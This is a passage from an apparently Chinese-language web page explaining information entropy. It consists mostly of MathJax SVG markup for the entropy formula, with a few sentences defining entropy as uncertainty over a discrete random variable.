45Q437 46 448 46H454Q481 46 514 49Q520 50 522 50T528 55T534 64T540 82T547 110T558 153Q565 181 569 198Q602 330 602 331T457 332H312L279 197Q245 63 245 58Q245 51 253 49T303 46H334Q340 38 340 37T337 19Q333 6 327 0H312Q275 2 178 2Q144 2 115 2T69 2T48 1Q31 1 31 10Q31 12 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(888,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1277,0)\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1780,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2446.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(3502.6,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"munder\" transform=\"translate(4447.2,0)\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M61 748Q64 750 489 750H913L954 640Q965 609 976 579T993 533T999 516H979L959 517Q936 579 886 621T777 682Q724 700 655 705T436 710H319Q183 710 183 709Q186 706 348 484T511 259Q517 250 513 244L490 216Q466 188 420 134T330 27L149 -187Q149 -188 362 -188Q388 -188 436 -188T506 -189Q679 -189 778 -162T936 -43Q946 -27 959 6H999L913 -249L489 -250Q65 -250 62 -248Q56 -246 56 -239Q56 -234 118 -161Q186 -81 245 -11L428 206Q428 207 242 462L57 717L56 728Q56 744 61 748Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1089,-285.4) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"msub\" transform=\"translate(5996.8,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mi\" transform=\"translate(6993.5,0)\"><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(278,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(8271.5,0)\"><path data-c=\"2061\" d=\"\"/></g><g data-mml-node=\"msub\" transform=\"translate(8438.1,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g></svg></mjx-container></span></p>\n<p><strong>熵衡量的是：你对一个系统的“不确定性”有多高。</strong></p>\n<ul>\n<li><strong>越不确定</strong> → 熵越高（例：完全随机）</li>\n<li><strong>越确定</strong> → 熵越低（例：你已经知道答案）</li>\n</ul>\n<p>设有一个离散随机变量 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: 0;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.928ex\" height=\"1.545ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -683 852 683\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D44B\" d=\"M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z\"/></g></g></g></svg></mjx-container></span>，取值为\n<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.439ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"13.052ex\" height=\"1.439ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 5769 636\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1008.6,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(1453.2,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(2461.8,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2906.4,0)\"><path data-c=\"2026\" d=\"M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(4245.1,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(4689.8,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"1D45B\" d=\"M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z\"/></g></g></g></g></svg></mjx-container></span>，其概率分布为：<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"15.333ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 6777 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D443\" d=\"M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(751,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1140,0)\"><path data-c=\"1D44B\" d=\"M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2269.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(3325.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(4224.5,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(4891.3,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(5947.1,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g></svg></mjx-container></span></p>\n<p>则信息熵定义为：<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.777ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"23.803ex\" height=\"2.563ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -789.6 10520.8 1132.9\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D43B\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 219 683Q260 681 355 681Q389 681 418 681T463 682T483 682Q499 682 499 672Q499 670 497 658Q492 641 487 638H485Q483 638 480 638T473 638T464 637T455 637Q416 636 405 634T387 623Q384 619 355 500Q348 474 340 442T328 395L324 380Q324 378 469 378H614L615 381Q615 384 646 504Q674 619 674 627T617 637Q594 637 587 639T580 648Q580 650 582 660Q586 677 588 679T604 682Q609 682 646 681T740 680Q802 680 835 681T871 682Q888 682 888 672Q888 645 876 638H874Q872 638 869 638T862 638T853 637T844 637Q805 636 794 634T776 623Q773 618 704 340T634 58Q634 51 638 51Q646 48 692 46H723Q729 38 729 37T726 19Q722 6 716 0H701Q664 2 567 2Q533 2 504 2T458 2T437 1Q420 1 420 10Q420 15 423 24Q428 43 433 45Q437 46 448 46H454Q481 46 514 49Q520 50 522 50T528 55T534 64T540 82T547 110T558 153Q565 181 569 198Q602 330 602 331T457 332H312L279 197Q245 63 245 58Q245 51 253 49T303 46H334Q340 38 340 37T337 19Q333 6 327 0H312Q275 2 178 2Q144 2 115 2T69 2T48 1Q31 1 31 10Q31 12 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(888,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1277,0)\"><path data-c=\"1D44B\" d=\"M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2129,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2795.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(3851.6,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"munderover\" transform=\"translate(4796.2,0)\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M61 748Q64 750 489 750H913L954 